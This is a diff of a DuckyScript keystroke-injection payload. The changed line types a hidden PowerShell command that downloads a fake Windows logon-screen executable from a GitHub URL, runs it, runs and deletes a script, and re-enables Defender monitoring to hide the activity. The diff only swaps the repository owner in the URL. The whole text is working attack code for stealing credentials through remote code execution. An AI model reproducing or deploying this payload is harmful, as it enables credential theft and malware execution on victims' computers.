@@ -83,5 +83,5 @@ STRING x
 DELAY 500
 
 REM Download and execute the .exe file
-STRING powershell -w h $url = 'https://github.com/CodingRabbi/Ducky-script-Fake-Windows-Logon/blob/main/FakeLogonScreenToFile.exe?raw=true'; $output = 'C:\Windows\Temp\your_file.exe'; Invoke-WebRequest -Uri $url -OutFile $output; Start-Process -FilePath $output -Wait; ./script.ps1 -Wait; Remove-Item './script.ps1' -Wait; Set-MpPreference -DisableRealtimeMonitoring $false; exit
+STRING powershell -w h $url = 'https://github.com/Potential-Threat/Ducky-script-Fake-Windows-Logon/blob/main/FakeLogonScreenToFile.exe?raw=true'; $output = 'C:\Windows\Temp\your_file.exe'; Invoke-WebRequest -Uri $url -OutFile $output; Start-Process -FilePath $output -Wait; ./script.ps1 -Wait; Remove-Item './script.ps1' -Wait; Set-MpPreference -DisableRealtimeMonitoring $false; exit
 ENTER
